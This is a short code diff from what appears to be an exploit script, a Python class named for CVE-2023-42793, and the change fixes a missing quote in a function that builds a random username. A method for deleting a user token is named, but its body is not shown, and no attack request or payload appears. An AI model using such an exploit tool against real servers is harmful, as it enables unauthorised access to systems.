@@ -73,7 +73,7 @@ class CVE_2023_42793:
 	def username(self):
 		name = "H454NSec"
 		random_id = random.randint(1000,9999)
-		return f"{name}{random_id}
+		return f"{name}{random_id}"
 	
 	def delete_user_token(self, url)
 		self.url = url
